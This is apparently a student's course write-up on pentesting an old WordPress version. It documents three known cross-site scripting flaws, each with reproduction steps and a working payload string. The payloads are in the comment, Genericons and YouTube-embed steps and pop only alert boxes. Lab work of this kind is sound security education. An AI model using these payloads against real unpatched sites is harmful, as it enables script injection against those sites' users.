# Project 7 - WordPress Pentesting

Time spent: 10 hours spent in total

> Objective: Find, analyze, recreate, and document **3 vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version:4.2.1
  - [x] GIF Walkthrough: <img src="https://github.com/Charding96/CyberSecur-w7/blob/master/Assignment_1XSS.gif?raw=true" width="800">
  - [x] Steps to recreate: <br/>
        *  Login as Guest
        *  Go on any post down to comment section
        *  post <a title='x onmouseover=alert(unescape(/hello%20world/.source))      style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
        - Beware the "A" needs to be 64kbs and over, in order to work. 
        - Need admin comment approval.
        
2. (Required) WordPress 4.1-4.2.1 - Unauthenticated Genericons Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version: 4.2.2
  - [x] GIF Walkthrough:<img src="https://github.com/Charding96/CyberSecur-w7/blob/master/Assignment_2XSS.gif?raw=true" width="800"> 
  - [x] Steps to recreate: 
        - Login as admin
        - Create new post
        - Post http://www.example.com/wp-content/themes/twentyfifteen/genericons/example.html#1<img/ src=1 onerror= alert('hello')>
        - Publish and view the post.
        
3. (Required)WordPress 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [x] Summary: 
    - Vulnerability types:XSS
    - Tested in version:4.0
    - Fixed in version:4.7.2 
  - [x] GIF Walkthrough:<img src="https://github.com/Charding96/CyberSecur-w7/blob/master/Assignment_3XSS.gif?raw=true" width="800"> 
  - [x] Steps to recreate: 
        - Login as admin 
        - Create new post
        - Post [embed src='https://www.youtube.com/embed/12345\x3csvg onload=alert("Hello")\x3e'][/embed]
        - Publish and view the page
## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
